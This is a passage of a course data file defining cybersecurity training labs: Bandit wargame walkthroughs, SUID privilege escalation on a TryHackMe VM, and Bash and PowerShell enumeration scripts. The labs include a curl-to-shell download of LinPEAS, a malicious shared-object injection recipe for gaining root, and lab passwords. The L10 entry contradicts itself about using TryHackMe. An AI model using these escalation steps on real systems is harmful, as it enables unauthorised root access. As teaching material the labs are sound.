            },
            {
              label: "Packet",
              detail: "network header added (IP)",
            },
            {
              label: "Frame",
              detail: "data link header + trailer added (MAC)",
            },
            {
              label: "Bits",
              detail: "physical layer transmission",
            },
          ],
        },
      },
      {
        title: "Scan a local target, then prove it with a capture",
        body: "Start the DVWA lab from L18 and run nmap -sV -p80 localhost:18080 against it to see a live local port forwarded from a container, tying that back to firewalls, port forwarding, and NAT. For at least one exercise, capture your own traffic in Wireshark alongside the command you ran.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "lan",
              label: "Your machine",
              kind: "device",
            },
            {
              id: "gw",
              label: "Docker port mapping",
              kind: "firewall",
            },
            {
              id: "host",
              label: "localhost:18080",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "lan",
              to: "gw",
            },
            {
              from: "gw",
              to: "host",
              label: "container port 80",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "You mapped real protocols to every OSI layer, traced encapsulation as it adds a header at each step down the stack, and connected port forwarding to an actual local scan and packet capture. That turns the M2 theory into something you can use to reason about how a real network actually moves traffic, not just recite.",
      },
    ],
    hints: [
      "Not sure which exercise covers what's tripping you up? Interface config is the basics, traceroute/ping is path tracing, netstat/ss is active connections, OSI Model wants a protocol per layer, and the L18 scan is port forwarding in action.",
      "For the OSI Model step, go layer by layer and name one real protocol or device for each of the 7 layers individually, rather than summarizing the model as a whole.",
      "For encapsulation, focus on how a new header gets added at each layer as you move down the stack — that's exactly what the exercise asks you to note.",
      "If you're unsure how to connect the theory to something real, capture your own traffic in Wireshark during at least one of the five exercises, as the lab asks.",
    ],
  },
  {
    id: "L06",
    number: 6,
    week: 3,
    moduleId: "m3-linux",
    title: "OverTheWire Bandit Levels 0-10",
    description:
      "OverTheWire's Bandit wargame is the single most common 'can this candidate actually use a terminal' filter that junior pentest and SOC roles apply, and every technique it drills — find by size/owner, grep across files, base64 decode — reappears constantly in real post-exploitation enumeration. This lab has you SSH into Bandit Level 0 and fight through to Level 10, where each level hides the next level's password somewhere on the filesystem behind a deliberately awkward obstacle: a filename that's a bare dash, a filename with spaces, a hidden dotfile, one human-readable file among decoys, an exact size-and-permission match across an entire filesystem, and a base64-encoded payload. You finish with core Linux navigation, file discovery, and text-processing commands under your fingers, not just in your notes.",
    objective:
      "SSH into OverTheWire Bandit Level 0 and solve through to Level 10, recovering each level's password and using it to reach the next.",
    successCriteria: [
      "Terminal screenshot shows the successful bandit10 SSH login banner",
      "The plaintext password string for bandit11 recovered and recorded",
      "A running notes file maps the command used to each level solved",
    ],
    platform: "OverTheWire",
    difficulty: "easy",
    estimatedHours: 4,
    instructions: [
      `Connect to Level 0: ssh bandit0@bandit.labs.overthewire.org -p 2220 (password: bandit0), then run cat readme to get the Level 1 password`,
      `Level 1->2: the password file is literally named '-'; read it with cat ./- (a bare dash is interpreted as stdin by cat otherwise)`,
      `Level 2->3: the filename contains spaces; use quotes or backslash-escapes, e.g. cat "spaces in this filename"`,
      `Level 3->4: look inside a hidden directory/file with ls -la, since dotfiles don't show under plain ls`,
      `Level 4->5: one of many files in a directory is the only human-readable one; run file ./-file* | grep ASCII to spot it without opening every file by hand`,
      `Level 5->6: find the password file by exact size and permission bits within a directory tree: find . -size 1033c ! -executable -type f 2>/dev/null`,
      `Level 6->7: the file lives somewhere on the whole filesystem, owned by a specific user and group: find / -size 33c -user bandit7 -group bandit6 2>/dev/null`,
      `Level 7->8: the password sits next to a specific keyword inside a large data file: grep <keyword> data.txt`,
      `Level 8->9: find the one line that appears exactly once in the data file: sort data.txt | uniq -u`,
      `Level 9->10: the data is base64-encoded; isolate the encoded string then decode it: base64 -d data.txt, and use the resulting bandit11 login to reach and read the Level 11 password`,
      `Keep a running notes file (command used -> level solved) and submit a screenshot of the bandit10 login banner plus the password you recovered for Level 11`,
    ],
    resources: [
      {
        title: "OverTheWire Bandit",
        url: "https://overthewire.org/wargames/bandit/",
        type: "platform",
      },
      {
        title: "explainshell.com",
        url: "https://explainshell.com",
        type: "tool",
      },
      {
        title: "SS64 Bash A-Z command index",
        url: "https://ss64.com/bash/",
        type: "link",
      },
    ],
    completionIndicator: `terminal screenshot showing the successful SSH login banner for bandit10@bandit.labs.overthewire.org followed by the plaintext password string recovered for bandit11`,
    flagFormat: "plaintext password string (no CTF-style flag wrapper)",
    slides: [
      {
        title: "Connect over SSH",
        body: "Every Bandit level is reached the same way: SSH into the wargame host on port 2220 using the current level's username and password, then hunt for the next password on disk.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "you",
              label: "You",
              kind: "attacker",
            },
            {
              id: "bandit",
              label: "bandit.overthewire.org:2220",
              kind: "server",
            },
          ],
          edges: [
            {
              from: "you",
              to: "bandit",
              label: "ssh bandit0@... -p 2220",
            },
          ],
        },
      },
      {
        title: "Level 0 -> 1: read the readme",
        body: "Log in with the published bandit0 password, then simply cat the readme file sitting in the home directory to get Level 1's password.",
        diagram: {
          type: "terminal",
          prompt: "bandit0@bandit:~$",
          lines: [
            {
              command: "cat readme",
            },
            {
              output: "Boalvo6BUowlBrhWlfCbbxfDwRA6UEja",
            },
          ],
        },
      },
      {
        title: "Level 5 -> 6: find by size and permissions",
        body: "Deeper levels hide the password inside a directory tree of decoy files. `find` with exact size and permission filters narrows thousands of files down to one.",
        diagram: {
          type: "file-tree",
          root: "inhere/",
          entries: [
            {
              path: "-file0",
              depth: 1,
            },
            {
              path: "-file1",
              depth: 1,
            },
            {
              path: "...",
              depth: 1,
            },
            {
              path: "-file7 (1033 bytes, not executable)",
              depth: 1,
              flagged: true,
              note: "this one",
            },
          ],
        },
      },
      {
        title: "Level 9 -> 10: decode the payload",
        body: "The final hop's password arrives base64-encoded inside a data file — decode it locally, then use that password to log in as bandit10 and read the Level 11 password.",
        diagram: {
          type: "terminal",
          prompt: "bandit9@bandit:~$",
          lines: [
            {
              command: "base64 -d data.txt",
            },
            {
              output: "The password is VgY0RVYzXPKAoBhg6C6D0K5vsq2wtdgs",
            },
          ],
        },
      },
      {
        title: "Why this matters",
        body: "Every command you used to fight through Bandit 0-10 — find by size and ownership, grep for a keyword, sort | uniq -u, base64 decode — is exactly what real post-exploitation enumeration looks like once you're on a box with a shell. This wargame is the standard first filter junior pentest and SOC roles use to check that a candidate can actually drive a terminal, not just talk about one.",
      },
    ],
    hints: [
      "Each level hides the password behind a different kind of obstacle — an odd filename, a hidden file, a pile of decoys, an exact size/ownership match, or an encoding. Work out which category the level you're stuck on falls into.",
      "For filename tricks (a bare '-', spaces, dotfiles), the fix is in how you reference the file — quoting or escaping it, or listing hidden files with ls -la.",
      "For decoy or exact-match levels, combine file with grep to spot the one human-readable file, or use find with -size, -user, and -group flags to match a single file.",
      "If the data looks like gibberish rather than hidden, it's likely just encoded — check whether it needs a straightforward base64 decode.",
    ],
  },
  {
    id: "L07",
    number: 7,
    week: 3,
    moduleId: "m3-linux",
    title: "Linux Permissions Challenge: SUID Privilege Escalation",
    description:
      "Misconfigured SUID binaries are one of the most common privilege-escalation paths pentesters find after landing an initial low-privilege shell — a single unnecessary rws bit can turn a foothold into full root. In TryHackMe's Linux PrivEsc room you SSH into an intentionally misconfigured Debian VM, enumerate every SUID-root binary with find / -perm -4000, then run LinPEAS to double-check your manual work and cross-reference the list against GTFOBins to spot documented abuse techniques. You then exploit a planted binary, /usr/local/bin/suid-so, via shared-object injection — building a malicious libcalc.so that the binary's dynamic linker loads instead of the legitimate library — to escalate from a standard user straight to uid=0(root). You leave able to read octal permission notation cold, tell a real SUID risk from a false positive, and remediate one yourself with chmod u-s.",
    objective:
      "On TryHackMe's Linux PrivEsc VM, enumerate SUID-root binaries, exploit the planted /usr/local/bin/suid-so via shared-object injection to reach root, then remediate one unnecessary SUID bit.",
    successCriteria: [
      "id returns uid=0(root) immediately after the shared-object exploit runs (screenshot)",
      "SUID binaries enumerated with find / -perm -4000 and cross-checked against LinPEAS and GTFOBins",
      "ls -l screenshot shows the SUID bit removed from a chosen binary via chmod u-s",
      "Each found SUID binary written up as a real risk or false positive",
    ],
    platform: "TryHackMe",
    difficulty: "easy",
    estimatedHours: 2,
    instructions: [
      "Deploy TryHackMe's Linux PrivEsc room (https://tryhackme.com/room/linuxprivesc), start the attached VM, and connect: ssh user@<TARGET_IP> (password: password321)",
      "Run manual SUID enumeration: find / -perm -4000 -type f 2>/dev/null to list every SUID-root binary on the box",
      "Download and run LinPEAS from the actively-maintained PEASS-ng project to cross-check your manual list: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      "For every unfamiliar SUID binary in the list, look it up on GTFOBins (gtfobins.github.io) to see if it has a documented SUID abuse technique",
      "Exploit the room's planted /usr/local/bin/suid-so binary via shared-object injection: build a malicious libcalc.so that sets uid to 0 and spawns a shell, then place it where the binary's dynamic linker will load it first",
      "Run the SUID binary and confirm root was obtained with id (expect uid=0(root))",
      "On the same VM, pick one genuinely unnecessary SUID bit and remove it: chmod u-s <file>, then confirm with ls -l <file>",
      "Before writing up, make sure you can read the octal notation cold: 4=read, 2=write, 1=execute, and the SUID bit itself adds 4000 on top of the normal permission digits (e.g. chmod 4755 sets rwsr-xr-x) — this is what lets you scan a long `find` output and immediately spot which bits are unusual",
      "Write up each SUID binary you found: whether GTFOBins lists an abuse technique for it, and whether it was a real risk or a false positive",
    ],
    resources: [
      {
        title: "TryHackMe: Linux PrivEsc",
        url: "https://tryhackme.com/room/linuxprivesc",
        type: "platform",
      },
      { title: "GTFOBins", url: "https://gtfobins.github.io", type: "link" },
      {
        title: "PEASS-ng / LinPEAS (GitHub)",
        url: "https://github.com/peass-ng/PEASS-ng",
        type: "tool",
      },
      {
        title: "explainshell.com",
        url: "https://explainshell.com",
        type: "tool",
      },
    ],
    completionIndicator: `terminal screenshot showing \`id\` returning uid=0(root) immediately after the SUID/shared-object exploit runs, plus a second screenshot of \`ls -l\` showing the SUID bit removed from the practice binary`,
    slides: [
      {
        title: "Connect to the vulnerable VM",
        body: "Deploy TryHackMe's Linux PrivEsc room, start the attached VM, and SSH in as the low-privilege user (password: password321) to begin enumeration.",
        diagram: {
          type: "network-topology",
          nodes: [
            {
              id: "you",
              label: "You",
              kind: "attacker",
            },
            {
              id: "vm",
              label: "TryHackMe Linux PrivEsc VM",
              kind: "victim",
            },
          ],
          edges: [
            {
              from: "you",
              to: "vm",
              label: "ssh user@<TARGET_IP>",
            },
          ],
        },
      },
      {
        title: "Enumerate SUID binaries manually",
        body: "Run find / -perm -4000 -type f 2>/dev/null to list every SUID-root binary on the box — the same manual check real internal pentests start privesc with.",
        diagram: {
          type: "terminal",
          prompt: "user@target:~$",
          lines: [
            {
              command: "find / -perm -4000 -type f 2>/dev/null",
            },
            {
              output: "...\n/usr/local/bin/suid-so",
            },
          ],
        },
      },
      {
        title: "Cross-check with LinPEAS and GTFOBins",
        body: "Download and run LinPEAS from PEASS-ng to verify your manual list, then look up every unfamiliar SUID binary on GTFOBins to see if it has a documented abuse technique.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Manual find",
              detail: "find / -perm -4000 -type f",
            },
            {
              label: "LinPEAS",
              detail: "curl ... linpeas.sh | sh",
            },
            {
              label: "GTFOBins lookup",
              detail: "gtfobins.github.io per binary",
            },
          ],
        },
      },
      {
        title: "Exploit /usr/local/bin/suid-so via shared-object injection",
        body: "The room plants a SUID-root binary at /usr/local/bin/suid-so. Build a malicious libcalc.so that sets uid to 0 and spawns a shell, then place it where the binary's dynamic linker will load it first.",
        diagram: {
          type: "file-tree",
          root: "/",
          entries: [
            {
              path: "usr/local/bin/suid-so",
              depth: 1,
              flagged: true,
              note: "SUID-root (rws), loads a shared object at runtime",
            },
            {
              path: "home/user/libcalc.so",
              depth: 1,
              note: "malicious .so: setuid(0) + spawn shell",
            },
          ],
        },
      },
      {
        title: "Confirm root",
        body: "Run the SUID binary and confirm root was obtained with id — you're looking for uid=0(root) in the output.",
        diagram: {
          type: "terminal",
          prompt: "user@target:~$",
          lines: [
            {
              command: "/usr/local/bin/suid-so",
            },
            {
              command: "id",
            },
            {
              output: "uid=0(root) gid=0(root) groups=0(root)",
            },
          ],
        },
      },
      {
        title: "Read the octal notation, then harden",
        body: "Know the octal cold: 4=read, 2=write, 1=execute, and the SUID bit adds 4000 on top (chmod 4755 sets rwsr-xr-x). Pick one genuinely unnecessary SUID bit on the VM and remove it with chmod u-s <file>, confirming with ls -l <file>.",
        diagram: {
          type: "terminal",
          prompt: "user@target:~$",
          lines: [
            {
              command: "chmod u-s <file>",
            },
            {
              command: "ls -l <file>",
            },
            {
              output: "-rwxr-xr-x 1 root root ... <file>",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "You turned a single overlooked SUID bit into full root — the exact escalation path real internal pentests chase down after an initial low-privilege foothold. Cross-referencing GTFOBins before exploiting, and confirming with LinPEAS, is the discipline that separates a verified finding from a guess; removing the unnecessary bit afterward is the fix a real report actually recommends.",
      },
    ],
    hints: [
      "If you don't know where to start, re-run the enumeration step — find / -perm -4000 -type f — to list every SUID-root binary before doing anything else.",
      "Once you've spotted /usr/local/bin/suid-so, the bug is in how it loads a shared object at runtime, not a straightforward permissions misconfiguration — research that category.",
      "Check GTFOBins for a documented abuse technique on shared-object / library-loading style SUID binaries before you try to build your own exploit.",
      "Build a malicious libcalc.so that sets uid to 0 and spawns a shell, then place it exactly where the suid-so binary's dynamic linker will load it first — id should then report uid=0(root).",
    ],
  },
  {
    id: "L08",
    number: 8,
    week: 3,
    moduleId: "m3-linux",
    title: "Bash Script: Enumerate users, processes & listening ports",
    description:
      "Every post-exploitation phase of a real engagement starts with the same question: who can log in, what's running, and what's listening on this box? Rather than blindly pasting LinPEAS output into a report, you write your own Bash enumeration script from scratch — a shebang-first enum.sh that pulls usernames from /etc/passwd, the full process table from ps aux, and listening ports from ss -tulpn into one labeled, reproducible report. Setting the executable bit and piping through tee for a timestamped log is exactly how a real assessor captures evidence during an engagement, not just how a script happens to run. Benchmarking your output against LinPEAS forces you to name precisely what your script misses and why it matters — you leave understanding enumeration well enough to build the tool, not just run someone else's.",
    objective:
      "Write an executable Bash enum.sh that reports local users from /etc/passwd, running processes from ps aux, and listening ports from ss -tulpn, then benchmark it against LinPEAS.",
    successCriteria: [
      "enum.sh output shows three clearly labeled sections in order: users, processes, listening ports",
      "Script starts with #!/bin/bash, has the executable bit set, and saves a timestamped report via tee",
      "2-3 checks LinPEAS performs that the script does not are listed with why each matters",
    ],
    platform: "Bash / Linux VM",
    difficulty: "medium",
    estimatedHours: 3,
    instructions: [
      "Create a new script file: enum.sh, and add #!/bin/bash as the first line so the system knows to run it with bash specifically",
      "Add a section that reads /etc/passwd and lists all usernames with cut -d: -f1 /etc/passwd",
      "Add a section that runs ps aux to list all running processes",
      "Add a section that runs ss -tulpn (or netstat -tulpn if ss isn't installed) to list listening ports and the process bound to each",
      'Add clear section headers (echo "=== Users ===" etc.) so the report is readable, not just raw command dumps',
      "Make the script executable with chmod +x enum.sh before attempting to run it directly as ./enum.sh",
      "Pipe the full script's output through tee to save a timestamped report file as well as print to screen: ./enum.sh | tee enum_report_$(date +%F).txt",
      "Run LinPEAS (https://github.com/peass-ng/PEASS-ng) on the same box and compare: list 2-3 checks it performs that your script doesn't, and explain why each matters",
    ],
    resources: [
      {
        title: "explainshell.com",
        url: "https://explainshell.com",
        type: "tool",
      },
      {
        title: "Bash scripting cheat sheet (devhints.io)",
        url: "https://devhints.io/bash",
        type: "link",
      },
      {
        title: "SS64 Bash A-Z command index",
        url: "https://ss64.com/bash/",
        type: "link",
      },
      {
        title: "PEASS-ng / LinPEAS (GitHub)",
        url: "https://github.com/peass-ng/PEASS-ng",
        type: "tool",
      },
    ],
    completionIndicator: `terminal output of enum.sh showing three clearly labeled sections in order — user list from /etc/passwd, ps aux process list, and ss -tulpn listening-port list`,
    slides: [
      {
        title: "Shebang first",
        body: "Create enum.sh and make #!/bin/bash the very first line, so the system always runs it with bash specifically rather than whatever the default shell happens to be.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "cat enum.sh",
            },
            {
              output: "#!/bin/bash",
            },
          ],
        },
      },
      {
        title: "Three labelled sections",
        body: "Build the script around three clearly-headed sections: usernames from /etc/passwd via cut -d: -f1, the full process list from ps aux, and listening ports from ss -tulpn (fall back to netstat -tulpn if ss isn't installed).",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "=== Users ===",
              detail: "cut -d: -f1 /etc/passwd",
            },
            {
              label: "=== Processes ===",
              detail: "ps aux",
            },
            {
              label: "=== Listening Ports ===",
              detail: "ss -tulpn (fallback: netstat -tulpn)",
            },
          ],
        },
      },
      {
        title: "Make it executable and save a timestamped report",
        body: "Set the executable bit with chmod +x enum.sh so it can run as ./enum.sh directly, then pipe its output through tee to save a timestamped report while still printing to screen: ./enum.sh | tee enum_report_$(date +%F).txt.",
        diagram: {
          type: "terminal",
          prompt: "$",
          lines: [
            {
              command: "chmod +x enum.sh",
            },
            {
              command: "./enum.sh | tee enum_report_$(date +%F).txt",
            },
          ],
        },
      },
      {
        title: "Benchmark against LinPEAS",
        body: "Run LinPEAS from the same PEASS-ng project on the same box and compare: list 2-3 checks it performs that your script doesn't, and explain why each matters for a fuller enumeration.",
      },
      {
        title: "What you just proved",
        body: "You built the exact enumeration a pentester or SOC analyst runs in the first minutes of post-exploitation access, and by writing it yourself instead of pasting a LinPEAS report, you now know precisely what each line of output means. Naming the checks LinPEAS runs that your script doesn't is what turns 'I ran a tool' into 'I understand what the tool does' — the difference that matters when you have to explain a finding in a real report.",
      },
    ],
    hints: [
      "If ./enum.sh won't run, check that the very first line is exactly #!/bin/bash and that you've set the executable bit.",
      "Structure the script around three clearly labeled sections — usernames, processes, and listening ports — each with its own echo header.",
      "Use cut -d: -f1 /etc/passwd for usernames, ps aux for processes, and ss -tulpn (or netstat -tulpn as a fallback) for listening ports.",
      "To keep a timestamped copy while still seeing output on screen, pipe the whole script through tee, e.g. ./enum.sh | tee enum_report_$(date +%F).txt.",
    ],
  },
  {
    id: "L09",
    number: 9,
    week: 4,
    moduleId: "m3-windows",
    title: "PowerShell Script: List processes, users & scheduled tasks",
    description:
      "Attackers who gain a foothold on Windows routinely plant scheduled tasks to survive reboots — one of the most common persistence mechanisms defenders have to hunt for during triage. This lab builds the Windows counterpart to Bash-based Linux enumeration: a PowerShell script that lists every running process ranked by CPU with Get-Process | Sort-Object -Property CPU -Descending, enumerates local accounts with Get-LocalUser, and pulls every scheduled task's state and last/next run time with Get-ScheduledTask and Get-ScheduledTaskInfo — the exact fields that expose a recently-modified persistence task. Saving the output from enum.ps1 and benchmarking it against both the legacy wmic command and WinPEAS shows you what a fuller triage catches that a bare script doesn't. You leave able to write native-cmdlet Windows triage scripts without needing a third-party tool at all.",
    objective:
      "Write a PowerShell enum.ps1 that lists processes ranked by CPU, local user accounts, and scheduled tasks with their last/next run times, then benchmark it against wmic and WinPEAS.",
    successCriteria: [
      "Console/report shows four labeled sections in order: Get-Process, Get-LocalUser, Get-ScheduledTask, and scheduled-task run times",
      "Script run elevated and saved as enum.ps1 with its generated report submitted",
      "2 checks each that wmic and WinPEAS perform which the script does not are noted",
    ],
    platform: "PowerShell",
    difficulty: "easy",
    estimatedHours: 2,
    instructions: [
      "Open PowerShell as Administrator (Get-LocalUser and full task visibility both require elevation)",
      "Add a section using Get-Process | Sort-Object -Property CPU -Descending, piped to Out-File for a saved report",
      "Add a section using Get-LocalUser | Select-Object Name,Enabled,LastLogon to list local accounts (fall back to net user on non-Windows-10/11 builds where Get-LocalUser isn't available)",
      "Add a section using Get-ScheduledTask | Select-Object TaskName,State,TaskPath to list scheduled tasks",
      "Add a fourth section using Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime to spot recently-modified tasks — a common attacker persistence indicator",
      "Save the script as enum.ps1, run it end to end, and submit the generated report file",
      "Compare your script's output against wmic process list brief (the older CMD-based equivalent) and against WinPEAS (from the same PEASS-ng project used for Linux), noting 2 checks each runs that yours doesn't",
    ],
    resources: [
      {
        title: "Microsoft PowerShell Docs",
        url: "https://learn.microsoft.com/powershell/",
        type: "link",
      },
      {
        title: "SS64 PowerShell reference",
        url: "https://ss64.com/ps/",
        type: "link",
      },
      {
        title: "Get-WinEvent / event log cmdlets reference",
        url: "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent",
        type: "link",
      },
      {
        title: "PEASS-ng / WinPEAS (GitHub)",
        url: "https://github.com/peass-ng/PEASS-ng",
        type: "tool",
      },
    ],
    completionIndicator: `PowerShell console/report screenshot showing four clearly labeled sections in order — Get-Process output, Get-LocalUser output, Get-ScheduledTask output, and scheduled-task last/next run times`,
    slides: [
      {
        title: "Elevate, then rank processes by CPU",
        body: "Open PowerShell as Administrator — Get-LocalUser and full scheduled-task visibility both require elevation — then start the script with Get-Process | Sort-Object -Property CPU -Descending, piped to Out-File so the ranked list is saved.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command:
                "Get-Process | Sort-Object -Property CPU -Descending | Out-File report.txt",
            },
          ],
        },
      },
      {
        title: "List local user accounts",
        body: "Add a section using Get-LocalUser | Select-Object Name,Enabled,LastLogon; if Get-LocalUser isn't available on the build you're using, fall back to the classic net user command.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command: "Get-LocalUser | Select-Object Name,Enabled,LastLogon",
            },
          ],
        },
      },
      {
        title: "Enumerate scheduled tasks and their run history",
        body: "List every scheduled task with Get-ScheduledTask | Select-Object TaskName,State,TaskPath, then pull run-time metadata with Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime — scheduled tasks are a top real-world persistence mechanism, so recently-run or recently-modified tasks are worth flagging.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command:
                "Get-ScheduledTask | Select-Object TaskName,State,TaskPath",
            },
            {
              command:
                "Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime",
            },
          ],
        },
      },
      {
        title: "Save as enum.ps1 and run it end to end",
        body: "Save the full script as enum.ps1, run it, and submit the generated report file as evidence of all four sections executing in order.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Get-Process",
            },
            {
              label: "Get-LocalUser",
            },
            {
              label: "Get-ScheduledTask",
            },
            {
              label: "Get-ScheduledTaskInfo",
            },
          ],
        },
      },
      {
        title: "Benchmark against wmic and WinPEAS",
        body: "Compare your script's output against the older wmic process list brief command, and against WinPEAS from the same PEASS-ng project used for Linux, noting two checks each performs that yours doesn't.",
        diagram: {
          type: "terminal",
          prompt: "PS C:\\>",
          lines: [
            {
              command: "wmic process list brief",
            },
          ],
        },
      },
      {
        title: "What you just proved",
        body: "Scheduled tasks are one of the most-abused persistence mechanisms on Windows, and you just built the native-cmdlet workflow a defender uses to hunt them — no third-party tool required. Comparing your script against wmic and WinPEAS shows exactly where a hand-built triage script is fast and where a dedicated tool still earns its place.",
      },
    ],
    hints: [
      "Re-check step 1 first — several of the cmdlets that follow, like Get-LocalUser and full scheduled-task visibility, only work if PowerShell is running elevated (as Administrator).",
      "For the scheduled-task section you need two separate commands: one that lists TaskName, State, and TaskPath, and a second one piped through Get-ScheduledTaskInfo to get LastRunTime and NextRunTime.",
      "That second scheduled-task command is exactly: Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime — this is what surfaces the recently-modified persistence indicator.",
    ],
  },
  {
    id: "L10",
    number: 10,
    week: 4,
    moduleId: "m3-windows",
    title: "Windows Fundamentals: Hands-On Tour of Your Own Machine",
    description:
      "Junior SOC and helpdesk-to-security interviews test this exact knowledge before anything else: not exploitation technique, but whether you actually know your way around the Windows OS you'll be defending. This lab walks the same three-part fundamentals arc — OS structure and navigation (versions, NTFS, the desktop), system administration (Control Panel, the Registry, resource monitoring), and the built-in security stack (Windows Update, Defender, BitLocker/TPM, and UAC) — entirely against your own Windows machine using this course's Module 3: Windows Basics as the guide, so nothing leaves the portal. You confirm each area by actually opening the tool on your own box (regedit, msinfo32, Task Manager, Windows Security) rather than reading about it, building the baseline fluency every later Windows lab in this program assumes you already have.",
    objective:
      "Build hands-on fluency with Windows OS structure, system configuration, and the built-in security stack by exploring each area on your own machine, guided by this course's Windows Basics module.",
    successCriteria: [
      "All Module 3 (Windows Basics) topics for structure, configuration, and security worked through, each confirmed by opening the real tool on your own machine",
      "A screenshot of at least one tool per area (e.g. regedit, msinfo32/systeminfo, Windows Security) captured as evidence",
      "Notes taken on any tool or setting you'd never opened before",
    ],
    platform: "In-House Portal + Your Windows Machine",
    difficulty: "easy",
    estimatedHours: 4,
    instructions: [
      `Open this course's Module 3: Windows Basics (m3-windows) — its topics cover exactly the three fundamentals areas below, in order`,
      `Structure & navigation: on your own machine confirm your Windows edition (winver / Get-ComputerInfo), browse the NTFS filesystem in Explorer, and check file/folder permissions (right-click > Properties > Security)`,
      `System configuration: open the Registry with regedit and note the main hives, open msinfo32 / run systeminfo, and watch live resource use in Task Manager (Performance tab)`,
      `Security stack: open Windows Security (Defender) and review protection status, check your BIOS/UEFI + BitLocker/TPM state (manage-bde -status or Get-BitLockerVolume), and observe a UAC prompt when launching an admin task`,
      `For each area, take notes on any tool or setting you'd never used before`,
      `Screenshot at least one real tool per area (regedit, msinfo32, Windows Security) on your own machine as evidence`,
    ],
    resources: [
      {
        title: "This course — Module 3: Windows Basics",
        url: "https://learn.microsoft.com/en-us/windows/",
        type: "link",
      },
      {
        title: "Microsoft Learn: Windows client documentation",
        url: "https://learn.microsoft.com/en-us/windows/client-management/",
        type: "link",
      },
      {
        title: "TryHackMe Windows Fundamentals rooms (optional extra practice)",
        url: "https://tryhackme.com/room/windowsfundamentals1xbx",
        type: "platform",
      },
    ],
    completionIndicator: `Screenshots of real Windows tools opened on your own machine — at least one per area (structure: Explorer/permissions or winver; configuration: regedit or msinfo32; security: Windows Security/Defender or BitLocker status) — plus your notes`,
    slides: [
      {
        title: "Guided by your own Windows Basics module",
        body: "No external platform needed: this course's Module 3 (Windows Basics) covers the same three fundamentals areas. You confirm each one by opening the real tool on your own Windows machine, so the whole tour stays inside the portal plus your own box.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "Structure & navigation",
              detail: "editions, NTFS, permissions",
            },
            {
              label: "System configuration",
              detail: "Registry, msinfo32, Task Manager",
            },
            {
              label: "Security stack",
              detail: "Defender, BitLocker/TPM, UAC",
            },
          ],
        },
      },
      {
        title: "Part 1: structure & navigation",
        body: "Work through the structure area on your own machine, covering Windows versions and editions, the desktop, the NTFS filesystem, and basic navigation.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "Versions & editions",
            },
            {
              label: "Desktop",
            },
            {
              label: "NTFS",
            },
            {
              label: "Basic navigation",
            },
          ],
        },
      },
      {
        title: "Windows Fundamentals 2: system configuration",
        body: "Room 2 covers system configuration: Control Panel, the Windows Registry, and resource monitoring.",
        diagram: {
          type: "flow-chain",
          steps: [
            {
              label: "Control Panel",
            },
            {
              label: "Registry",
            },
            {
              label: "Resource monitoring",
            },
          ],
        },
      },
      {
        title: "Windows Fundamentals 3: built-in security tooling",
        body: "Room 3 covers Windows Update, Windows Security/Defender, BitLocker, TPM, and UAC — the built-in defenses you rely on before reaching for third-party tools.",
        diagram: {
          type: "layer-stack",
          layers: [
            {
              label: "Windows Update",
            },
            {
              label: "Defender / Windows Security",
            },
            {
              label: "BitLocker & TPM",
            },
            {
              label: "UAC",
            },
          ],
        },
      },
      {
        title: "Capture your evidence",
        body: "For each room, note any tool or setting you'd never used before opening it, then screenshot the green 100%-complete progress bar as your evidence.",
      },
      {
        title: "What you just proved",
        body: "You built the baseline Windows fluency — navigation, configuration, and native security tooling — that every later lab in this program assumes you already have. This is precisely the ground floor most SOC and helpdesk-to-security interviews check before asking about exploitation at all.",
      },
    ],
    hints: [
      "If you're unsure how to get started, look at the very first step — you need a TryHackMe account plus either the VPN or the in-browser AttackBox before any room content will load.",
      "Each of the three rooms covers a different topic area: Fundamentals 1 is OS structure and navigation, Fundamentals 2 is system configuration, and Fundamentals 3 is built-in security tooling — figure out which topic you're stuck on and go to that specific room.",
      "Don't forget the evidence requirement at the end — you need a screenshot of each room's progress bar showing 100%/green, not just having read through the room content.",
    ],
  },
  {
    id: "L11",
    number: 11,
    week: 4,
    moduleId: "m3-windows",
    title: "Analyse a Windows Event Log for 5 suspicious events",
    description:
      "An alert fires, and the first move on any SOC shift is the same: open the relevant event log and reconstruct what actually happened, in what order, using nothing but Event IDs and timestamps. A real training walkthrough shows exactly how much three correlated IDs can reveal: filtering roughly 8,000 entries down to Event ID 11707/1033 exposed a suspicious installer, Event ID 4657 showed it had rewritten the HKCU Run key, and Event ID 1074 confirmed the resulting shutdown-on-login loop. You load a real attack-sample .evtx file into Event Viewer, filter for password-spray patterns (4625/4624), account and privilege changes (4720/4732), and persistence indicators (7045, 4688, 4657), then correlate five flagged Event IDs by timestamp into a written incident timeline. The skill you leave with is exactly this: turning a raw, noisy log into a defensible sequence of what happened and why it's suspicious.",
    objective:
      "Load a real attack-sample .evtx into Event Viewer, filter for logon, account/privilege, persistence, and install Event IDs, and correlate five flagged events by timestamp into a written incident timeline.",
    successCriteria: [
      "Event Viewer screenshot shows the 5 flagged suspicious Event IDs together in the filtered results",
      "Each flagged Event ID checked against the Ultimate Windows Security encyclopedia to confirm field interpretation",
      "A written timeline reconstructs what happened and in what order (e.g. install, then registry change, then shutdown)",
    ],
    platform: "Event Viewer",
    difficulty: "medium",
    estimatedHours: 2,
    assets: [
      {
        name: "password-spray.evtx",
